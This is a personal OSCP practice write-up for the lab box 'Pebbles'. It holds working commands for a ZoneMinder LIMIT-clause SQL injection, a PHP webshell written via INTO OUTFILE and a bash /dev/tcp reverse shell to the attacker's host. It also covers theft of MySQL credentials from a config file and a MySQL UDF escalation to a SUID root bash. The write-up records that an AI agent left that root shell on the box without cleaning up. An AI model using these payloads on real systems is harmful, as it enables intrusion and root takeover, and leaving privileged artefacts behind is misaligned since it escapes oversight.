---
tags: [oscp, boxes, pg-practice, linux, completed, redo]
platform: PG Practice
os: Linux
hostname: pebbles
difficulty: Intermediate
ip: $BoxIP
status: Complete
box_sources: [Pebbles]
redo: true
redo_reason: Codex left /tmp/rootbash (SUID bash) on the box before manual run -- UDF privesc step was skipped. Needs a clean run to do the full MySQL UDF chain manually.
root_flag: 63641d7ec1c3be6ee6c803552d3bbfe1
---

# PG: Pebbles, Full Walkthrough

## The gist

Pebbles is an authorized practice target. The verified route is documented below, from initial enumeration through the final privilege boundary and clean-down. The source notes establish this route: 1. [[OSCP/RUNBOOK V2/Linux - SQLi]] confirmed the web application's database injection point. 2. [[OSCP/RUNBOOK V2/Linux - Database Access]] used database access to prepare the local privilege path. 3. [[OSCP/RUNBOOK V2/Linux - SUID Check]] located the required privileged helper and completed the escalation chain.

## Box information

| Field | Value |
|---|---|
| Platform | PG Practice |
| OS | Linux |
| IP | $BoxIP |
| Difficulty | Intermediate |
| Status | Root |

---

## Vulnerability summary

| # | Finding | Evidence |
|---|---|---|
| 1 | Recon | See section 1 below |
| 2 | Web Enumeration | See section 2 below |
| 3 | Vulnerability Identification | See section 3 below |
| 4 | SQLi Confirmation (SLEEP Test) | See section 4 below |
| 5 | Foothold | See section 5 below |
| 6 | Privilege Escalation | See section 6 below |

## Evidence and loot

The private source workspace is `/home/kali/Platforms/Offsec/Pebbles`. The transcript, Nmap output, loot, and screenshots below are the primary evidence for this box.

## Variables

```bash
boxset BoxName Pebbles
boxset BoxIP "$BoxIP"
boxset LocalIP "$LocalIP"
boxset BoxDir "$BoxDir"
```

## 1. Recon

### Port Scan

Full port scan, then service scan on open ports.

```bash
sudo nmap -p- --min-rate 10000 -oN allports.nmap $BoxIP
```

```bash
sudo nmap -sV -sC -p <open ports> -oN services.nmap $BoxIP
```

Key open ports:

| Port | Service | Notes |
|---|---|---|
| 80 | HTTP (Apache) | ZoneMinder web app |
| 8080 | HTTP (Tomcat/Java) | Secondary surface -- not needed |
| 111 | RPCbind | Standard, not useful here |

`shot nmap-allports` / `shot nmap-services`

---

## 2. Web Enumeration

### Port 80 -- Root

```bash
curl -s http://$BoxIP/
```

Redirect to `/zm/` -- ZoneMinder CCTV management application.

### Port 80 -- /zm/

```bash
curl -s http://$BoxIP/zm/
```

Landing page confirms ZoneMinder is running. Version leaks in HTML source:

```bash
curl -s http://$BoxIP/zm/ | grep -i version
```

Output:
```
<title>ZoneMinder - v1.29.0</title>
```

Version: **ZoneMinder 1.29.0**

`shot zoneminder-version`

---

## 3. Vulnerability Identification

```bash
searchsploit zoneminder
```

Relevant result:

```
ZoneMinder 1.29/1.30 - Multiple Vulnerabilities  php/webapps/41239.txt
```

```bash
searchsploit -p 41239
cp /usr/share/exploitdb/exploits/php/webapps/41239.txt exploits/
```

> [!tip] ⚡ More efficient path
> **What we did:** We queried the exploit path and copied the text file with a separate command.
>
> **Faster approach:**
> ```bash
> searchsploit -m 41239
> ```
> **Why:** The `-m` option copies the matching Exploit-DB entry directly. That is fewer commands and less chance of mistyping the path.

Reading the exploit:

- SQLi in the `limit` POST parameter of the log query endpoint
- Endpoint: `index.php?view=request&request=log&task=query`
- Parameter: `limit=100` -- injected into raw MySQL `LIMIT` clause
- Stacked queries work: `limit=100;SELECT SLEEP(5)#`
- Query structure: `SELECT * FROM Logs WHERE TimeKey > ? order by TimeKey desc limit [input]`

> [!abstract] 🧠 Why
> A numeric-looking parameter can still be injectable when it is concatenated into SQL. The sleep test proves evaluation, but `INTO OUTFILE` adds separate requirements: stacked queries, database file privileges, and a writable web path.

---

## 4. SQLi Confirmation (SLEEP Test)

```bash
time curl -s -X POST "http://$BoxIP/zm/index.php" \
  -d "view=request&request=log&task=query&limit=100;SELECT SLEEP(5)#"
```

Response time: **5.175 seconds** -- SLEEP executed. Stacked query injection confirmed.

> [!warning] 💡 Hint
> **Watch out:** A time delay proves the SQL expression ran, but it does not prove a later file write will work. `INTO OUTFILE` also needs database file-write permission and a web-writable destination.

> [!tip] 🛠️ Alternative tools
> `sqlmap` can confirm the injection when manual comparison is noisy, but manual requests are preferable for understanding a non-standard `LIMIT` injection and controlling the file-write query.

**Bonus finding from the response body** -- SQL errors in the log output reveal the web root:
```
File: /usr/share/zoneminder/www/includes/database.php
```

Web root: `/usr/share/zoneminder/www/`

`shot sqli-confirmed` (red box: `5.175 total`)

---

## 5. Foothold

### Step 1 -- Write PHP Webshell via OUTFILE

```bash
curl -s -X POST "http://$BoxIP/zm/index.php" \
  -d "view=request&request=log&task=query&limit=100;SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/usr/share/zoneminder/www/cmd.php'#"
```

### Step 2 -- Test RCE

```bash
curl -s "http://$BoxIP/zm/cmd.php?cmd=id"
```

Output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

RCE confirmed as www-data.

> [!tip] ⚡ Efficiency
> Prove the shell with `id` before attempting a callback. If `id` works but the listener receives nothing, troubleshoot egress and shell syntax separately instead of changing the SQLi payload.

`shot webshell-rce` (red box: `uid=33(www-data)`)

### Step 3 -- Reverse Shell

Start listener:
```bash
sudo nc -lvnp 80
```

Fire shell:
```bash
curl -G "http://$BoxIP/zm/cmd.php" --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/$LocalIP/80 0>&1'"
```

Shell received as `www-data`.

`shot foothold` (red box: `www-data@pebbles` prompt)

### Step 4 -- Stabilise

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
# Enter
export TERM=xterm
```

Note: `python` (Python 2) not installed. `python3` required. Same lesson as Bratarina -- always try python3 if python fails.

---

## 6. Privilege Escalation

### Finding: MySQL Credentials in ZoneMinder Config

ZoneMinder stores its DB credentials in plaintext config:

```bash
cat /etc/zm/zm.conf | grep -E "DB_PASS|DB_USER|DB_NAME"
```

Output:
```
ZM_DB_USER=root
ZM_DB_PASS=$DbPassword
ZM_DB_NAME=zm
```

MySQL is running as root. This means any `sys_exec()` UDF call runs OS commands as root.

`boxset Password $DbPassword`
`loot cred root $DbPassword`

> [!warning] 💡 Common mistake
> MySQL being reachable does not imply that its OS process runs as root. Confirm the database process context before treating a UDF as a root escalation path.

### Technique: MySQL UDF -- sys_exec

MySQL supports User Defined Functions (UDFs) loaded from shared libraries. `lib_mysqludf_sys.so` provides `sys_exec()` -- a function that runs OS commands.

With root MySQL creds and MySQL running as the root OS user:

```bash
mysql -u root -p$DbPassword zm -e "SELECT sys_exec('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash');"
```

This creates a SUID copy of `/bin/bash` owned by root.

Verify:
```bash
ls -la /tmp/rootbash
# -rwsr-xr-x 1 root root 1037528 Aug 27 06:16 /tmp/rootbash
```

### Escalate

```bash
/tmp/rootbash -p
```

```
id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
```

`shot root-shell` (red box: `euid=0(root)`)

---

## 7. Decision points and alternate routes

| Observation | Primary route used here | Useful alternative or fallback |
|---|---|---|
| Time-based SQLi works in a numeric parameter | Confirm stacked queries and the visible webroot | Use UNION extraction if file writes are unavailable |
| `INTO OUTFILE` creates a PHP shell | Prove `id`, then use the webshell for enumeration | Keep command output over HTTP if callbacks are filtered |
| ZoneMinder config exposes database credentials | Check the MySQL process identity before UDF use | Review SUID, sudo, and writable service paths if MySQL is not root |
| SUID Bash is created | Run with `-p` and verify effective UID | Use the database command channel to remove the helper during cleanup |

## 8. Vulnerabilities / Techniques

| CVE / Ref | Description | Impact |
|---|---|---|
| EDB-41239 | ZoneMinder 1.29/1.30 -- SQLi in `limit` POST param (stacked queries) | RCE as www-data via OUTFILE webshell |
| MySQL UDF privesc | MySQL running as root + sys_exec UDF = arbitrary OS command execution | euid=0 |
| SUID bash | `/tmp/rootbash -p` gives effective root | Full root shell |

---

## 9. Vault Update Checklist

- [ ] Screenshots in `$BoxDir/screenshots/` (box-started, nmap-allports, nmap-services, webshell-rce, foothold, root-shell, root-flag, PROOF)
- [ ] Loot: `flags.txt` (root flag), `creds.txt` (MySQL root creds)
- [ ] Log copied to `OSCP/BOXES/BOX LOGS/Pebbles.log`
- [x] Stage notes updated: HTTP - Initial Recon, Foothold - SQLi to Shell, Web App - SQLi, PrivEsc Linux - UDF
- [x] Module notes updated: M10 (SQL Injection), M13 (Public Exploits), M18 (Linux PrivEsc)
- [x] MASTER BOX LIST updated (row checked off)
- [ ] FAQ: LIMIT injection, MySQL UDF privesc, OUTFILE path from error leak

## 10. RUNBOOK V2 Stages Used

- [[OSCP/RUNBOOK V2/Linux - SQLi]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Linux - Database Access]] -- technique used in this walkthrough
- [[OSCP/RUNBOOK V2/Linux - SUID Check]] -- technique used in this walkthrough

## 11. Collect the flags

```bash
cat /root/proof.txt
```

| Flag | Value |
|---|---|
| Root | `63641d7ec1c3be6ee6c803552d3bbfe1` |

`shot root-flag`
`shot PROOF` (whoami + hostname + IP + flag all in one frame)

`loot flag root 63641d7ec1c3be6ee6c803552d3bbfe1`

---


### Captured flag values from source loot


#### `loot/flags.txt`

```text
root: 63641d7ec1c3be6ee6c803552d3bbfe1
root: 63641d7ec1c3be6ee6c803552d3bbfe1
```

## 12. Clean down
Record every payload, temporary file, modified configuration, account, listener, and transfer server created during the run. Restore changed files, remove only recorded artifacts, verify their absence, and run `boxdone`.

## 13. Attack narrative in one page
1. [[OSCP/RUNBOOK V2/Linux - SQLi]] confirmed the web application's database injection point.
2. [[OSCP/RUNBOOK V2/Linux - Database Access]] used database access to prepare the local privilege path.
3. [[OSCP/RUNBOOK V2/Linux - SUID Check]] located the required privileged helper and completed the escalation chain.

## Tools used

| Tool | Purpose |
|---|---|
| nmap | Port and service scanning |
| curl | Web recon, SQLi delivery, webshell RCE, reverse shell trigger |
| searchsploit | Finding EDB-41239 |
| nc | Reverse shell listener |
| MySQL UDF (lib_mysqludf_sys.so) | sys_exec for OS command execution as root |

---

## Credentials and secrets

| Username | Password | Source | Used for |
|---|---|---|---|
| root | `$DbPassword` | /etc/zm/zm.conf | MySQL |

---


### Captured private values from source loot

These values are retained here because this vault is private. The source path remains the authority if a value appears truncated.

#### `.env`

```text
export BoxName="Pebbles"
export BoxIP="192.168.183.52"
export BoxPlatform="Offsec"
export BoxDir="/home/kali/Platforms/Offsec/Pebbles"
export Domain=""
export DCip=""
export Username=""
export Password=""
export Username2=""
export Password2=""
export Username3=""
export Password3=""
export Hash=""
export NThash=""
export Port="4444"
export Port2="4445"
export WebPort="80"
export URL=""
export LocalIP=$(ip a show tun0 2>/dev/null | grep "inet " | awk '{print $2}' | cut -d/ -f1)
export Wordlist="/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
```

### Sensitive transcript evidence

```text
[sudo] password for kali:
							<td><b>Password:</b></td>
							<td><input type="password" id="password" name="password"></td>
							<td colspan=2><center><a href="#">Forgot password?</a></center></td>
Hash: SHA256
Example: Cookie before the login = ZMSESSID=26ga0i62e4e51mhfcb68nk3dg2 after successful login
A possible CSRF attack form, which changes the password of the admin (uid=1), if the corresponding user activates it.
      <input type="hidden" name="newUser&#91;Password&#93;"
      <input type="hidden" name="conf&#95;password" value="admin1" />
$ [11:49:06] loot flag root 63641d7ec1c3be6ee6c803552d3bbfe1
$ [11:50:57] loot flag root 63641d7ec1c3be6ee6c803552d3bbfe1
kali@kali:~/Platforms/Offsec/Pebbles [11:34:33] $ [?1h=[?2004hloot flag root 63641d7ec1c3be6ee6c803552d3bbfe1loot[?1l>[?2004l
[+] Flag saved:  root = 63641d7ec1c3be6ee6c803552d3bbfe1  →  loot/flags.txt
kali@kali:~/Platforms/Offsec/Pebbles [11:49:13] $ [?1h=[?2004hloot flag root 63641d7ec1c3be6ee6c803552d3bbfe1loot[?1l>[?2004l
Password:
Password for user postgres:
```


## Remediation recommendations

| Finding | Recommendation |
|---|---|
| Initial access path on Pebbles | Remove or patch the vulnerable service, restrict exposure, and rotate any credentials recovered during testing. |
| Privilege escalation path | Remove the misconfiguration, enforce least privilege, and verify the corrected permissions or policy. |
| Assessment artifacts | Remove payloads and temporary files, restore modified files, and review logs for the test activity. |

## Lessons learned and vault links

1. **Web root leaks from SQL errors** -- the error message in the JSON response contained `/usr/share/zoneminder/www/includes/database.php`. Always read the full response body from a test payload -- it can save you a separate enumeration step.

2. **OUTFILE for webshell when you know the web root** -- if you have stacked query injection and a writable web root, `SELECT ... INTO OUTFILE '/var/www/html/cmd.php'` is a direct path to RCE without needing UNION-based data exfil.

3. **LIMIT injection is underrated** -- the `LIMIT` clause is not often thought of as injectable. Here the raw value was dropped straight in -- no quoting, no filtering. Always test numeric params with `SLEEP` if you suspect SQLi.

4. **MySQL running as root + UDF = game over** -- if `mysql -u root` works on a box, check if the process is running as the root OS user. If yes, `sys_exec` via UDF hands you arbitrary command execution as root. Steps: load lib, create function, call sys_exec.

5. **python vs python3 again** -- python2 not installed, python3 required for pty spawn. Default to python3 first on modern boxes. See also: [[Bratarina]].

6. **Codex artefact cleanup** -- Codex ran the UDF chain earlier and left `/tmp/rootbash` on the box. This skipped the privesc discovery step for our manual run. Going forward: Codex must clean up its artefacts (webshells, SUID copies, UDF registrations) before handing over for a manual run.

7. **Port 8080 (Tomcat) was a secondary surface** -- identified in nmap, not needed. Always note secondary surfaces in the write-up even if unused.

---

- Keep database enumeration separate from privilege escalation so each result has a clear purpose.
- A clean rerun matters when an earlier run leaves a shortcut payload behind.

### Related boxes

- [[OSCP/BOXES/WRITE UPS/Linux/Nibbles|Nibbles]] -- shares a similar enumeration or escalation pattern
- [[OSCP/BOXES/WRITE UPS/Linux/Snookums|Snookums]] -- shares a similar enumeration or escalation pattern

## External resources

| Resource | Link | Why |
|---|---|---|
| HackTricks - ZoneMinder SQLi | https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting-web/sql-injection | Stacked queries, OUTFILE technique |
| HackTricks - MySQL UDF Privesc | https://github.com/HackTricks-wiki/hacktricks/blob/master/pentesting/pentesting-mysql.md | sys_exec / lib_mysqludf_sys workflow |
| PayloadsAllTheThings - SQLi OUTFILE | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#file-write | INTO OUTFILE payloads |
| PayloadsAllTheThings - MySQL UDF | https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md | UDF privesc steps |
| RevShells | https://www.revshells.com | Bash reverse shell one-liners |
| GTFOBins - bash SUID | https://gtfobins.github.io/gtfobins/bash/#suid | `-p` flag for SUID bash |
| EDB-41239 | https://www.exploit-db.com/exploits/41239 | Original ZoneMinder SQLi PoC |
| ippsec.rocks | https://ippsec.rocks/?#zoneminder | HTB boxes using ZoneMinder technique |

---

## Related RUNBOOK V2 stages

- [[OSCP/RUNBOOK V2/Start Here]]
- [[OSCP/RUNBOOK V2/Linux - Service Scan]]
- [[OSCP/RUNBOOK V2/Linux - Web Enum]]
- [[OSCP/RUNBOOK V2/Linux - Shell Stabilise]]
- [[OSCP/RUNBOOK V2/Linux - Local Enum]]
- [[OSCP/RUNBOOK V2/Linux - Clean Down]]

## Why this matters for OSCP

This page matters because it turns a repeatable assessment task into a clear, reviewable habit for the OSCP exam.
